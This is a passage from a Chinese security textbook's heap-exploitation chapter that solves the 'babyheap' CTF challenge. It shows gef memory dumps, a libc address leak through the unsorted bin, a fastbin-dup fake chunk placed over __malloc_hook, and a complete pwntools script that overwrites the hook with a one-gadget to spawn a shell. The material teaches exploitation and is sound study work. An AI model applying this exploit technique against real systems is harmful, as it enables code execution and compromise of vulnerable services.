0x55620ca32070: 0x4141414141414141
0x4141414141414141
0x55620ca32080: 0x0000000000000000
0x0000000000000021
# chunk4, new chunk2
0x55620ca32090: 0x0000000000000000
0x0000000000000000
......
0x55620ca32100: 0x0000000000000000
0x0000000000000000
0x55620ca32110: 0x0000000000000000
0x0000000000020ef1
# top chunk
gef➤
x/18gx 0x20dc959e07c0-0x10
0x20dc959e07b0: 0x0000000000000001
0x0000000000000010
# table
0x20dc959e07c0: 0x000055620ca32010
0x0000000000000001
0x20dc959e07d0: 0x0000000000000010
0x000055620ca32050
0x20dc959e07e0: 0x0000000000000001
0x0000000000000010
0x20dc959e07f0: 0x000055620ca32090
0x0000000000000001
# table[2]
第 11 章
堆利用 ┃ LXIII
0x20dc959e0800: 0x0000000000000010
0x000055620ca32070
0x20dc959e0810: 0x0000000000000001
0x0000000000000080
0x20dc959e0820: 0x000055620ca32090
0x0000000000000000
# table[4]
0x20dc959e0830: 0x0000000000000000
0x0000000000000000
接下来我们将 chunk4->size 修改回 0x91，并申请另一个 small chunk 以防止 chunk4 与 top chunk
合并，此时释放 chunk4 就可将其放入 unsorted_bin。
gef➤
x/36gx 0x000055620ca32000
0x55620ca32000: 0x0000000000000000
0x0000000000000021
# chunk0
0x55620ca32010: 0x4141414141414141
0x4141414141414141
0x55620ca32020: 0x0000000000000000
0x0000000000000021
# chunk1 [free]
0x55620ca32030: 0x0000000000000000
0x4141414141414141
0x55620ca32040: 0x0000000000000000
0x0000000000000021
# chunk2
0x55620ca32050: 0x0000000000000000
0x0000000000000000
0x55620ca32060: 0x0000000000000000
0x0000000000000021
# chunk3
0x55620ca32070: 0x4141414141414141
0x4141414141414141
0x55620ca32080: 0x0000000000000000
0x0000000000000091
# chunk4 [free]
0x55620ca32090: 0x00007f3d58cabb78
0x00007f3d58cabb78
# fd, bk
0x55620ca320a0: 0x0000000000000000
0x0000000000000000
......
0x55620ca32100: 0x0000000000000000
0x0000000000000000
0x55620ca32110: 0x0000000000000090
0x0000000000000090
# chunk5
gef➤
heap bins unsorted
[+] unsorted_bins[0]: fw=0x55620ca32080, bk=0x55620ca32080
→
Chunk(addr=0x55620ca32090, size=0x90, flags=PREV_INUSE)
gef➤
vmmap libc
Start
End
Offset
Perm Path
0x00007f3d588e7000 0x00007f3d58aa7000 0x0000000000000000 r-x /.../libc-2.23.so
0x00007f3d58aa7000 0x00007f3d58ca7000 0x00000000001c0000 --- /.../libc-2.23.so
0x00007f3d58ca7000 0x00007f3d58cab000 0x00000000001c0000 r-- /.../libc-2.23.so
0x00007f3d58cab000 0x00007f3d58cad000 0x00000000001c4000 rw- /.../libc-2.23.so
此时被释放的 chunk4 的 fd，bk 指针均指向 libc 中的地址，只要将其泄露出来，通过计算即可
得到 libc 中的偏移，进而得到 one-gadget 的地址。
gef➤
p 0x00007f3d58cabb78 - 0x00007f3d588e7000
$1 = 0x3c4b78
我们知道，__malloc_hook 是一个弱类型的函数指针变量，指向 void * function(size_t size, void *
caller)，当调用 malloc()函数时，首先会判断 hook 函数指针是否为空，不为空则调用它。所以接下来
再次利用 fastbin dup 修改__malloc_hook 使其指向 one-gadget。但由于 fast chunk 的大小只能在 0x20
到 0x80 之间，我们就需要一点小小的技巧，即错位偏移，如下所示。
gef➤
x/10gx (long long)(&main_arena)-0x30
0x7f3d58cabaf0: 0x00007f3d58caa260
0x0000000000000000
0x7f3d58cabb00 :
0x00007f3d5896ce20
0x00007f3d5896ca00
0x7f3d58cabb10 : 0x0000000000000000
0x0000000000000000 # target
0x7f3d58cabb20 :
0x0000000000000000
0x0000000000000000
0x7f3d58cabb30 : 0x0000000000000000
0x0000000000000000
第 11 章
堆利用 ┃ LXIV
gef➤
x/8gx (long long)(&main_arena)-0x30+0xd
0x7f3d58cabafd: 0x3d5896ce20000000
0x3d5896ca0000007f
0x7f3d58cabb0d: 0x000000000000007f
0x0000000000000000
# fake chunk
0x7f3d58cabb1d: 0x0000000000000000
0x0000000000000000
0x7f3d58cabb2d: 0x0000000000000000
0x0000000000000000
我们先将一个 fast chunk 放进 fastbin（与 0x7f 大小的 fake chunk 相匹配），修改其 fd 指针指向
fake chunk。然后将 fake chunk 分配出来，进而修改其数据为 one-gadget。最后，只要调用 calloc()触
发 hook 函数，即可执行 one-gadget 获得 shell。
gef➤
x/24gx 0x20dc959e07c0-0x10
0x20dc959e07b0: 0x0000000000000001
0x0000000000000010
# table
0x20dc959e07c0: 0x000055620ca32010
0x0000000000000001
0x20dc959e07d0: 0x0000000000000010
0x000055620ca32050
0x20dc959e07e0: 0x0000000000000001
0x0000000000000010
0x20dc959e07f0: 0x000055620ca32090
0x0000000000000001
0x20dc959e0800: 0x0000000000000010
0x000055620ca32070
0x20dc959e0810: 0x0000000000000001
0x0000000000000060
0x20dc959e0820: 0x000055620ca32090
0x0000000000000001
0x20dc959e0830: 0x0000000000000080
0x000055620ca32120
0x20dc959e0840: 0x0000000000000001
0x0000000000000060
0x20dc959e0850: 0x00007f3d58cabb0d
0x0000000000000000
# table[6]
0x20dc959e0860: 0x0000000000000000
0x0000000000000000
gef➤
x/10gx (long long)(&main_arena)-0x30
0x7f3d58cabaf0: 0x00007f3d58caa260
0x0000000000000000
0x7f3d58cabb00 :
0x00007f3d5896ce20
0x0000003d5896ca00
0x7f3d58cabb10 :
0x00007f3d5892c26a
0x0000000000000000
0x7f3d58cabb20 :
0x0000000000000000
0x0000000000000000
0x7f3d58cabb30 :
0x0000000000000000
0x0000000000000000
其实，本题还有很多种调用 one-gadget 的方法，例如修改__realloc_hook 和__free_hook，或者修
改 IO_FILE 结构体等，我们会在 12.3 节中补充介绍。
解题代码
from pwn import *
io = remote('0.0.0.0', 10001)
# io = process('./babyheap')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
def alloc(size):
io.sendlineafter("Command: ", '1')
io.sendlineafter("Size: ", str(size))
def fill(idx, cont):
io.sendlineafter("Command: ", '2')
io.sendlineafter("Index: ", str(idx))
io.sendlineafter("Size: ", str(len(cont)))
io.sendafter("Content: ", cont)
def free(idx):
io.sendlineafter("Command: ", '3')
io.sendlineafter("Index: ", str(idx))
第 11 章
堆利用 ┃ LXV
def dump(idx):
io.sendlineafter("Command: ", '4')
io.sendlineafter("Index: ", str(idx))
io.recvuntil("Content: \n")
return io.recvline()
def fastbin_dup():
alloc(0x10)
# chunk0
alloc(0x10)
# chunk1
alloc(0x10)
# chunk2
alloc(0x10)
# chunk3
alloc(0x80)
# chunk4
free(1)
free(2)
payload
= "A" * 0x10
payload += p64(0) + p64(0x21)
payload += p64(0) + "A" * 8
payload += p64(0) + p64(0x21)
payload += p8(0x80)
# chunk2->fd => chunk4
fill(0, payload)
payload
= "A" * 0x10
payload += p64(0) + p64(0x21)
# chunk4->size
fill(3, payload)
alloc(0x10)
# chunk1
alloc(0x10)
# chunk2, overlap chunk4
def leak_libc():
global libc_base, malloc_hook
payload
= "A" * 0x10
payload += p64(0) + p64(0x91)
# chunk4->size
fill(3, payload)
alloc(0x80)
# chunk5
free(4)
leak_addr = u64(dump(2)[:8])
libc_base = leak_addr - 0x3c4b78
malloc_hook = libc_base + libc.symbols['__malloc_hook']
log.info("leak address: 0x%x" % leak_addr)
log.info("libc base: 0x%x" % libc_base)
log.info("__malloc_hook address: 0x%x" % malloc_hook)
def pwn():
alloc(0x60)
# chunk4
free(4)
fill(2, p64(malloc_hook - 0x20 + 0xd))
第 11 章
堆利用 ┃ LXVI
alloc(0x60)
# chunk4
alloc(0x60)
# chunk6 (fake chunk)
one_gadget = libc_base + 0x4526a
fill(6, p8(0)*3 + p64(one_gadget))
# __malloc_hook => one-gadget
alloc(1)
io.interactive()
if __name__=='__main__':
fastbin_dup()
leak_libc()
pwn()